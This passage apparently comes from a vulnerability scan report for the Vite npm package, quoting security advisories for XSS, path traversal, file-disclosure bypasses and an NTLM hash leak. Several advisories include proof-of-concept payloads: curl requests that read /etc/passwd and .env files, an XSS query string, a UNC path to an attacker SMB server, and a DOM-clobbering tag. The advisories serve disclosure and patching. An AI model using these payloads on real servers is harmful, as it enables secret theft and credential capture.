    - Edit URL to set query string to `?%22%3E%3C/script%3E%3Cscript%3Ealert(%27boom%27)%3C/script%3E` and navigate
    - Witness XSS:
    - ![image](https://user-images.githubusercontent.com/2456381/287434281-13757894-7a63-4a73-b1e9-d2b024c19d14.png)
- Example 2. Serving HTML from SSR-style Express server (Vite dev server runs in middleware mode):
    - Go to https://stackblitz.com/edit/vitejs-vite-9xhma4?file=main.js&terminal=server
    - (Same steps as above)
- Example 3. Plain `vite dev` (this shows that vanilla `vite dev` is _not_ vulnerable, provided `htmlFallbackMiddleware` is used)
    - Go to https://stackblitz.com/edit/vitejs-vite-9xhma4?file=main.js&terminal=dev
    - (Same steps as above)
    - You should _not_ see the alert box in this case

### Detailed Impact

This will probably predominantly affect [development-mode SSR](https://vitejs.dev/guide/ssr#setting-up-the-dev-server), where `vite.transformHtml` is called using the original `req.url`, per the docs:

https://github.com/vitejs/vite/blob/7fd7c6cebfcad34ae7021ebee28f97b1f28ef3f3/docs/guide/ssr.md?plain=1#L114-L126

However, since this vulnerability affects `server.transformIndexHtml`, the scope of impact may be higher to also include other ad-hoc calls to `server.transformIndexHtml` from outside of Vite's own codebase.

My best guess at bisecting which versions are vulnerable involves the following test script

```js
import fs from 'node:fs/promises';
import * as vite from 'vite';

const html = `
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
  </head>
  <body>
    <script type="module">
      // Inline script
    </script>
  </body>
</html>
`;
const server = await vite.createServer({ appType: 'custom' });
const transformed = await server.transformIndexHtml('/?%22%3E%3C/script%3E%3Cscript%3Ealert(%27boom%27)%3C/script%3E', html);
console.log(transformed);
await server.close();
```

and using it I was able to narrow down to #13581. If this is correct, then vulnerable Vite versions are 4.4.0-beta.2 and higher (which includes 4.4.0).

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-46565?s=github&n=vite&t=npm&vr=%3C%3D4.5.13"><img alt="medium 6.0: CVE--2025--46565" src="https://img.shields.io/badge/CVE--2025--46565-lightgrey?label=medium%206.0&labelColor=fbb552"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code><=4.5.13</code></td></tr>
<tr><td>Fixed version</td><td><code>4.5.14</code></td></tr>
<tr><td>CVSS Score</td><td><code>6</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.243%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>70th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
The contents of files in [the project `root`](https://vite.dev/config/shared-options.html#root) that are denied by a file matching pattern can be returned to the browser.

### Impact

Only apps explicitly exposing the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.
Only files that are under [project `root`](https://vite.dev/config/shared-options.html#root) and are denied by a file matching pattern can be bypassed.

- Examples of file matching patterns: `.env`, `.env.*`, `*.{crt,pem}`, `**/.env`
- Examples of other patterns: `**/.git/**`, `.git/**`, `.git/**/*`

### Details
[`server.fs.deny`](https://vite.dev/config/server-options.html#server-fs-deny) can contain patterns matching against files (by default it includes `.env`, `.env.*`, `*.{crt,pem}` as such patterns).
These patterns were able to bypass for files under `root` by using a combination of slash and dot (`/.`).

### PoC
```
npm create vite@<!-- -->latest
cd vite-project/
cat "secret" > .env
npm install
npm run dev
curl --request-target /.env/. http://localhost:5173
```

![image](https://github.com/user-attachments/assets/822f4416-aa42-461f-8c95-a88d155e674b)
![image](https://github.com/user-attachments/assets/42902144-863a-4afb-ac5b-fc16effa37cc)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-32395?s=github&n=vite&t=npm&vr=%3C4.5.13"><img alt="medium 6.0: CVE--2025--32395" src="https://img.shields.io/badge/CVE--2025--32395-lightgrey?label=medium%206.0&labelColor=fbb552"/></a> <i>Exposure of Sensitive Information to an Unauthorized Actor</i>

<table>
<tr><td>Affected range</td><td><code><4.5.13</code></td></tr>
<tr><td>Fixed version</td><td><code>4.5.13</code></td></tr>
<tr><td>CVSS Score</td><td><code>6</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.810%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>79th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
The contents of arbitrary files can be returned to the browser if the dev server is running on Node or Bun.

### Impact
Only apps with the following conditions are affected.

- explicitly exposing the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host))
- running the Vite dev server on runtimes that are not Deno (e.g. Node, Bun)

### Details

[HTTP 1.1 spec (RFC 9112) does not allow `#` in `request-target`](https://datatracker.ietf.org/doc/html/rfc9112#section-3.2). Although an attacker can send such a request. For those requests with an invalid `request-line` (it includes `request-target`), the spec [recommends to reject them with 400 or 301](https://datatracker.ietf.org/doc/html/rfc9112#section-3.2-4). The same can be said for HTTP 2 ([ref1](https://datatracker.ietf.org/doc/html/rfc9113#section-8.3.1-2.4.1), [ref2](https://datatracker.ietf.org/doc/html/rfc9113#section-8.3.1-3), [ref3](https://datatracker.ietf.org/doc/html/rfc9113#section-8.1.1-3)).

On Node and Bun, those requests are not rejected internally and is passed to the user land. For those requests, the value of [`http.IncomingMessage.url`](https://nodejs.org/docs/latest-v22.x/api/http.html#messageurl) contains `#`. Vite assumed `req.url` won't contain `#` when checking `server.fs.deny`, allowing those kinds of requests to bypass the check.

On Deno, those requests are not rejected internally and is passed to the user land as well. But for those requests, the value of `http.IncomingMessage.url` did not contain `#`. 

### PoC
```
npm create vite@<!-- -->latest
cd vite-project/
npm install
npm run dev
```
send request to read `/etc/passwd`
```
curl --request-target /@<!-- -->fs/Users/doggy/Desktop/vite-project/#/../../../../../etc/passwd http://127.0.0.1:5173
```

</blockquote>
</details>

<a href="https://scout.docker.com/v/GHSA-8jhw-289h-jh2g?s=gitlab&n=vite&t=npm&vr=%3E%3D4.0.0%2C%3C4.5.3"><img alt="medium 5.9: GHSA--8jhw--289h--jh2g" src="https://img.shields.io/badge/GHSA--8jhw--289h--jh2g-lightgrey?label=medium%205.9&labelColor=fbb552"/></a> <i>OWASP Top Ten 2017 Category A9 - Using Components with Known Vulnerabilities</i>

<table>
<tr><td>Affected range</td><td><code>>=4.0.0<br/><4.5.3</code></td></tr>
<tr><td>Fixed version</td><td><code>2.9.18, 3.2.10, 4.5.3, 5.0.13, 5.1.7, 5.2.6</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

[Vite dev server option](https://vitejs.dev/config/server-options.html#server-fs-deny) `server.fs.deny` did not deny requests for patterns with directories. An example of such a pattern is `/foo/**/*`.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-31207?s=github&n=vite&t=npm&vr=%3E%3D4.0.0%2C%3C%3D4.5.2"><img alt="medium 5.9: CVE--2024--31207" src="https://img.shields.io/badge/CVE--2024--31207-lightgrey?label=medium%205.9&labelColor=fbb552"/></a> <i>Exposure of Sensitive Information to an Unauthorized Actor</i>

<table>
<tr><td>Affected range</td><td><code>>=4.0.0<br/><=4.5.2</code></td></tr>
<tr><td>Fixed version</td><td><code>4.5.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.711%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>54th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
[Vite dev server option](https://vitejs.dev/config/server-options.html#server-fs-deny) `server.fs.deny` did not deny requests for patterns with directories. An example of such a pattern is `/foo/**/*`.

### Impact
Only apps setting a custom `server.fs.deny` that includes a pattern with directories, and explicitly exposing the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.

### Patches
Fixed in vite@<!-- -->5.2.6, vite@<!-- -->5.1.7, vite@<!-- -->5.0.13, vite@<!-- -->4.5.3, vite@<!-- -->3.2.10, vite@<!-- -->2.9.18

### Details
`server.fs.deny` uses picomatch with the config of `{ matchBase: true }`. [matchBase](https://github.com/micromatch/picomatch/blob/master/README.md#options:~:text=Description-,basename,-boolean) only matches the basename of the file, not the path due to a bug (https://github.com/micromatch/picomatch/issues/89). The vite config docs read like you should be able to set fs.deny to glob with picomatch. Vite also does not set `{ dot: true }` and that causes [dotfiles not to be denied](https://github.com/micromatch/picomatch/blob/master/README.md#options:~:text=error%20is%20thrown.-,dot,-boolean) unless they are explicitly defined.

**Reproduction**

Set fs.deny to `['**/.git/**']` and then curl for `/.git/config`.

* with `matchBase: true`, you can get any file under  `.git/` (config, HEAD, etc).
* with `matchBase: false`, you cannot get any file under  `.git/` (config, HEAD, etc).


</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-53632?s=github&n=vite&t=npm&vr=%3C%3D6.4.2"><img alt="medium 5.5: CVE--2026--53632" src="https://img.shields.io/badge/CVE--2026--53632-lightgrey?label=medium%205.5&labelColor=fbb552"/></a> <i>Insufficiently Protected Credentials</i>

<table>
<tr><td>Affected range</td><td><code><=6.4.2</code></td></tr>
<tr><td>Fixed version</td><td><code>6.4.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:A/VC:N/VI:N/VA:N/SC:H/SI:H/SA:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.464%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>41st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
The `launch-editor` NPM package accesses arbitrary paths including Windows UNC paths. When a UNC path is opened, Windows automatically attempts NTLM authentication to the remote host, causing the user’s NTLMv2 password hash to be leaked to an attacker-controlled SMB server. This can result in credential compromise through offline hash cracking.

### Impact

If the following conditions are met, an attacker can get the NTLMv2 password hash on the computer that is using the `launch-editor`:

- using Windows
- NTLM is not disabled ([it is recommended to disable](https://techcommunity.microsoft.com/blog/windows-itpro-blog/advancing-windows-security-disabling-ntlm-by-default/4489526), while it's still enabled by default)
- the user accesses the attackers website that sends request to a middleware using `launch-editor`
- the server that has the middleware using `launch-editor` is running
- the attacker knows the URL for that server and the middleware

This would be a problem if the user password is too simple that it can be identified through offline hash cracking, potentially leading to further compromise of developer accounts or internal systems.

### Details
`launch-editor` accepts file paths without validating or restricting Windows UNC paths such as:

```
\\attacker-host\share
```

On Windows systems, accessing a UNC path triggers an automatic NTLM authentication attempt to the remote SMB server. No user interaction or warning is required for this authentication attempt to occur.

If an attacker controls the SMB server referenced by the UNC path the victim’s NTLMv2 hash is transmitted to the attacker. The attacker can then capture the hash and perform offline password cracking. Successful cracking reveals the victim’s cleartext password.

The attacker could target a developer that uses a development server using `launch-editor` to develop code locally, send them a link and grab their NTLMv2 hash.

### PoC
From the attacker side, we will setup an SMB server. I personally used [Impacket's smbserver.py](https://github.com/fortra/impacket/blob/master/examples/smbserver.py), but you could use something like [Responder](https://github.com/lgandx/Responder) for this as well. For keeping it simple, we will use `smbserver.py` here.

First, let's create a directory to serve as an SMB share.
```
mkdir /tmp/data
echo "Hello world" > /tmp/data/test.txt
```

Then, start the SMB server.
```
$ sudo smbserver.py -smb2support -debug share /tmp/data
```

Now, run any project that uses the launch-editor package. I have setup a simple "Hello world" project that uses Vite to do this. Then run the project locally (`vite`).

Now last, we will open a browser window and navigate to the URL used by the launch-editor package to trigger the NTLM authentication. Or we can use `curl` to achieve the same.

```
curl 'http://localhost:5173/__open-in-editor?file=%5c%5c127.0.0.1%5cshare%5ctest.txt'
```

Note the IP address in the HTTP request, and make sure it connects to the IP address of the SMB server. Now we can look at the logs of `smbserver.py` and see the NTLMv2 hash coming in.

<img width="1916" height="277" alt="2026-01-30_10-58" src="https://github.com/user-attachments/assets/2f606e8f-c9bb-41dc-b507-ea6606b53368" />

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-31486?s=github&n=vite&t=npm&vr=%3C4.5.12"><img alt="medium 5.3: CVE--2025--31486" src="https://img.shields.io/badge/CVE--2025--31486-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>Exposure of Sensitive Information to an Unauthorized Actor</i>

<table>
<tr><td>Affected range</td><td><code><4.5.12</code></td></tr>
<tr><td>Fixed version</td><td><code>4.5.12</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>40.461%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>99th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

The contents of arbitrary files can be returned to the browser.

### Impact

Only apps explicitly exposing the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.

### Details

#### `.svg`

Requests ending with `.svg` are loaded at this line.
https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290
By adding `?.svg` with `?.wasm?init` or with `sec-fetch-dest: script` header, the restriction was able to bypass.

This bypass is only possible if the file is smaller than [`build.assetsInlineLimit`](https://vite.dev/config/build-options.html#build-assetsinlinelimit) (default: 4kB) and when using Vite 6.0+.

#### relative paths

The check was applied before the id normalization. This allowed requests to bypass with relative paths (e.g. `../../`).

### PoC

```bash
npm create vite@<!-- -->latest
cd vite-project/
npm install
npm run dev
```

send request to read `etc/passwd`

```bash
curl 'http://127.0.0.1:5173/etc/passwd?.svg?.wasm?init'
```

```bash
curl 'http://127.0.0.1:5173/@<!-- -->fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&?raw'
```

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-31125?s=github&n=vite&t=npm&vr=%3C4.5.11"><img alt="medium 5.3: CVE--2025--31125" src="https://img.shields.io/badge/CVE--2025--31125-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>Exposure of Sensitive Information to an Unauthorized Actor</i>

<table>
<tr><td>Affected range</td><td><code><4.5.11</code></td></tr>
<tr><td>Fixed version</td><td><code>4.5.11</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>74.939%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>100th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

The contents of arbitrary files can be returned to the browser.

### Impact
Only apps explicitly exposing the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.

### Details

- base64 encoded content of non-allowed files is exposed using `?inline&import` (originally reported as `?import&?inline=1.wasm?init`)
- content of non-allowed files is exposed using `?raw?import`

`/@<!-- -->fs/` isn't needed to reproduce the issue for files inside the project root.

### PoC

Original report (check details above for simplified cases):

The ?import&?inline=1.wasm?init ending allows attackers to read arbitrary files and returns the file content if it exists.  Base64 decoding needs to be performed twice
```
$ npm create vite@<!-- -->latest
$ cd vite-project/
$ npm install
$ npm run dev
```

Example full URL `http://localhost:5173/@<!-- -->fs/C:/windows/win.ini?import&?inline=1.wasm?init`

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-30208?s=github&n=vite&t=npm&vr=%3C4.5.10"><img alt="medium 5.3: CVE--2025--30208" src="https://img.shields.io/badge/CVE--2025--30208-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>Exposure of Sensitive Information to an Unauthorized Actor</i>

<table>
<tr><td>Affected range</td><td><code><4.5.10</code></td></tr>
<tr><td>Fixed version</td><td><code>4.5.10</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>74.771%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>100th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
The contents of arbitrary files can be returned to the browser.

### Impact
Only apps explicitly exposing the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.

### Details
`@<!-- -->fs` denies access to files outside of Vite serving allow list. Adding `?raw??` or `?import&raw??` to the URL bypasses this limitation and returns the file content if it exists. This bypass exists because trailing separators such as `?` are removed in several places, but are not accounted for in query string regexes.

### PoC
```bash
$ npm create vite@<!-- -->latest
$ cd vite-project/
$ npm install
$ npm run dev

$ echo "top secret content" > /tmp/secret.txt

# expected behaviour
$ curl "http://localhost:5173/@<!-- -->fs/tmp/secret.txt"

    <body>
      <h1>403 Restricted</h1>
      <p>The request url &quot;/tmp/secret.txt&quot; is outside of Vite serving allow list.

# security bypassed
$ curl "http://localhost:5173/@<!-- -->fs/tmp/secret.txt?import&raw??"
export default "top secret content\n"
//# sourceMappingURL=data:application/json;base64,eyJ2...
```

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-45812?s=github&n=vite&t=npm&vr=%3E%3D4.0.0%2C%3C4.5.4"><img alt="medium 4.8: CVE--2024--45812" src="https://img.shields.io/badge/CVE--2024--45812-lightgrey?label=medium%204.8&labelColor=fbb552"/></a> <i>Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</i>

<table>
<tr><td>Affected range</td><td><code>>=4.0.0<br/><4.5.4</code></td></tr>
<tr><td>Fixed version</td><td><code>4.5.4</code></td></tr>
<tr><td>CVSS Score</td><td><code>4.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:A/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.636%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>51st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

We discovered a DOM Clobbering vulnerability in Vite when building scripts to `cjs`/`iife`/`umd` output format. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an img tag with an unsanitized name attribute) are present.

Note that, we have identified similar security issues in Webpack: https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986

### Details

**Backgrounds**

DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:

[1] https://scnps.co/papers/sp23_domclob.pdf
[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/

**Gadgets found in Vite**

We have identified a DOM Clobbering vulnerability in Vite bundled scripts, particularly when the scripts dynamically import other scripts from the assets folder and the developer sets the build output format to `cjs`, `iife`, or `umd`. In such cases, Vite replaces relative paths starting with `__VITE_ASSET__` using the URL retrieved from `document.currentScript`.

However, this implementation is vulnerable to a DOM Clobbering attack. The `document.currentScript` lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the src attribute of the attacker-controlled element is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.

```
const relativeUrlMechanisms = {
  amd: (relativePath) => {
    if (relativePath[0] !== ".") relativePath = "./" + relativePath;
    return getResolveUrl(
      `require.toUrl('${escapeId(relativePath)}'), document.baseURI`
    );
  },
  cjs: (relativePath) => `(typeof document === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath)})`,
  es: (relativePath) => getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', import.meta.url`
  ),
  iife: (relativePath) => getRelativeUrlFromDocument(relativePath),
  // NOTE: make sure rollup generate `module` params
  system: (relativePath) => getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', module.meta.url`
  ),
  umd: (relativePath) => `(typeof document === 'undefined' && typeof location === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath, true)})`
};
```

### PoC

Considering a website that contains the following `main.js` script, the devloper decides to use the Vite to bundle up the program with the following configuration. 

```
// main.js
import extraURL from './extra.js?url'
var s = document.createElement('script')
s.src = extraURL
document.head.append(s)
```

```
// extra.js
export default "https://myserver/justAnOther.js"
```

```
// vite.config.js
import { defineConfig } from 'vite'

export default defineConfig({
  build: {
    assetsInlineLimit: 0, // To avoid inline assets for PoC
    rollupOptions: {
      output: {
        format: "cjs"
      },
    },
  },
  base: "./",
});
```

After running the build command, the developer will get following bundle as the output.

```
// dist/index-DDmIg9VD.js
"use strict";const t=""+(typeof document>"u"?require("url").pathToFileURL(__dirname+"/extra-BLVEx9Lb.js").href:new URL("extra-BLVEx9Lb.js",document.currentScript&&document.currentScript.src||document.baseURI).href);var e=document.createElement("script");e.src=t;document.head.append(e);
```

Adding the Vite bundled script, `dist/index-DDmIg9VD.js`, as part of the web page source code, the page could load the `extra.js` file from the attacker's domain, `attacker.controlled.server`. The attacker only needs to insert an `img` tag with the `name` attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.


```
<!DOCTYPE html>
<html>
<head>
  <title>Vite Example</title>
  <!-- Attacker-controlled Script-less HTML Element starts--!>
  <img name="currentScript" src="https://attacker.controlled.server/"></img>
  <!-- Attacker-controlled Script-less HTML Element ends--!>
</head>
<script type="module" crossorigin src="/assets/index-DDmIg9VD.js"></script>
<body>
</body>
</html>
```

### Impact

This vulnerability can result in cross-site scripting (XSS) attacks on websites that include Vite-bundled files (configured with an output format of `cjs`, `iife`, or `umd`) and allow users to inject certain scriptless HTML tags without properly sanitizing the name or id attributes.

### Patch

```
// https://github.com/vitejs/vite/blob/main/packages/vite/src/node/build.ts#L1296
const getRelativeUrlFromDocument = (relativePath: string, umd = false) =>
  getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', ${
      umd ? `typeof document === 'undefined' ? location.href : ` : ''
    }document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI`,
  )
```

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-58752?s=github&n=vite&t=npm&vr=%3C%3D5.4.19"><img alt="low 2.3: CVE--2025--58752" src="https://img.shields.io/badge/CVE--2025--58752-lightgrey?label=low%202.3&labelColor=fce1a9"/></a> <i>Exposure of Sensitive Information to an Unauthorized Actor</i>

<table>
<tr><td>Affected range</td><td><code><=5.4.19</code></td></tr>
<tr><td>Fixed version</td><td><code>5.4.20</code></td></tr>
<tr><td>CVSS Score</td><td><code>2.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.608%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>50th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
Any HTML files on the machine were served regardless of the `server.fs` settings.

### Impact

Only apps that match the following conditions are affected:

- explicitly exposes the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host))
- `appType: 'spa'` (default) or `appType: 'mpa'` is used

This vulnerability also affects the preview server. The preview server allowed HTML files not under the output directory to be served.

### Details
The [serveStaticMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L123) function is in charge of serving static files from the server. It returns the [viteServeStaticMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L136) function which runs the needed tests and serves the page. The viteServeStaticMiddleware function [checks if the extension of the requested file is ".html"](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L144). If so, it doesn't serve the page. Instead, the server will go on to the next middlewares, in this case [htmlFallbackMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/htmlFallback.ts#L14), and then to [indexHtmlMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/indexHtml.ts#L438). These middlewares don't perform any test against allow or deny rules, and they don't make sure that the accessed file is in the root directory of the server. They just find the file and send back its contents to the client.

### PoC
Execute the following shell commands:

```
npm  create  vite@<!-- -->latest
cd vite-project/
echo  "secret" > /tmp/secret.html
npm install
npm run dev
```

Then, in a different shell, run the following command:

`curl  -v  --path-as-is  'http://localhost:5173/../../../../../../../../../../../tmp/secret.html'`

The contents of /tmp/secret.html will be returned.

This will also work for HTML files that are in the root directory of the project, but are in the deny list (or not in the allow list). Test that by stopping the running server (CTRL+C), and running the following commands in the server's shell:

```
echo  'import path from "node:path"; import { defineConfig } from "vite"; export default defineConfig({server: {fs: {deny: [path.resolve(__dirname, "secret_files/*")]}}})'  >  [vite.config.js](http://vite.config.js)
mkdir secret_files
echo "secret txt" > secret_files/secret.txt
echo "secret html" > secret_files/secret.html
npm run dev

```

Then, in a different shell, run the following command:

`curl  -v  --path-as-is  'http://localhost:5173/secret_files/secret.txt'`

You will receive a 403 HTTP Response,  because everything in the secret_files directory is denied.

Now in the same shell run the following command:

`curl  -v  --path-as-is  'http://localhost:5173/secret_files/secret.html'`

You will receive the contents of secret_files/secret.html.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-58751?s=github&n=vite&t=npm&vr=%3C%3D5.4.19"><img alt="low 2.3: CVE--2025--58751" src="https://img.shields.io/badge/CVE--2025--58751-lightgrey?label=low%202.3&labelColor=fce1a9"/></a> <i>Exposure of Sensitive Information to an Unauthorized Actor</i>

<table>
<tr><td>Affected range</td><td><code><=5.4.19</code></td></tr>
<tr><td>Fixed version</td><td><code>5.4.20</code></td></tr>
<tr><td>CVSS Score</td><td><code>2.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.263%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>70th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
Files starting with the same name with the public directory were served bypassing the `server.fs` settings.

### Impact
Only apps that match the following conditions are affected:

- explicitly exposes the Vite dev server to the network (using --host or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))
- uses [the public directory feature](https://vite.dev/guide/assets.html#the-public-directory) (enabled by default)
- a symlink exists in the public directory

### Details
The [servePublicMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L79) function is in charge of serving public files from the server. It returns the [viteServePublicMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L106) function which runs the needed tests and serves the page. The viteServePublicMiddleware function [checks if the publicFiles variable is defined](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L111), and then uses it to determine if the requested page is public. In the case that the publicFiles is undefined, the code will treat the requested page as a public page, and go on with the serving function. [publicFiles may be undefined if there is a symbolic link anywhere inside the public directory](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/publicDir.ts#L21). In that case, every requested page will be passed to the public serving function. The serving function is based on the [sirv](https://github.com/lukeed/sirv) library. Vite patches the library to add the possibility to test loading access to pages, but when the public page middleware [disables this functionality](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L89) since public pages are meant to be available always, regardless of whether they are in the allow or deny list.

In the case of public pages, the serving function is [provided with the path to the public directory](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L85) as a root directory. The code of the sirv library [uses the join function to get the full path to the requested file](https://github.com/lukeed/sirv/blob/d061616827dd32d53b61ec9530c9445c8f592620/packages/sirv/index.mjs#L42). For example, if the public directory is "/www/public", and the requested file is "myfile", the code will join them to the string "/www/public/myfile". The code will then pass this string to the normalize function. Afterwards, the code will [use the string's startsWith function](https://github.com/lukeed/sirv/blob/d061616827dd32d53b61ec9530c9445c8f592620/packages/sirv/index.mjs#L43) to determine whether the created path is within the given directory or not. Only if it is, it will be served.

